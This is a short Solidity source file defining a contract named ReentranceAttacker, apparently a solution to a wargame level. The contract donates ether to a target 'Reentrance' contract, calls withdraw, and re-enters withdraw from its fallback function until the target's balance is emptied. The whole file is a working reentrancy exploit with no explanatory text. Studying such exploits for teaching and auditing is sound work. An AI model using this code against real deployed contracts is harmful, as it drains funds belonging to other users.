// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    IReentrance private reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable returns (bool) {
        reentrance.donate{value: 10 ether}(address(this));
        reentrance.withdraw(10 ether);
        return true;
    }

    fallback() external payable {
        if (address(reentrance).balance >= 10 ether) {
            reentrance.withdraw(10 ether);
        } else if (address(reentrance).balance > 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}
